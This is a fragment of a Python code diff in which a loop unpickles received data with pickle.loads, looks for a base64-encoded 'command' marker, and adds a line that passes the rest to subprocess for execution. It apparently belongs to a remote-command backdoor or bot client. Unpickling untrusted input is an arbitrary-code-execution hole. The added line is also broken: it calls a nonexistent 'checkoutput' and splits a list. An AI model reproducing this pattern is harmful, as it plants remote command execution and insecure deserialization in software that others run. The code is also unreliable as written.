@@ -19,7 +19,8 @@ def main():
             data = pickle.loads(raw_data)
             if str(data).startswith('Y29tbWFuZA==', 0, len(data)):
                 raw_command = str(data).split('Y29tbWFuZA==')
-                print raw_command
+                print(raw_command)
+                output=subprocess.checkoutput([raw_command.split(' ')])
             else:
                 pass
             if data == 'a_ha':
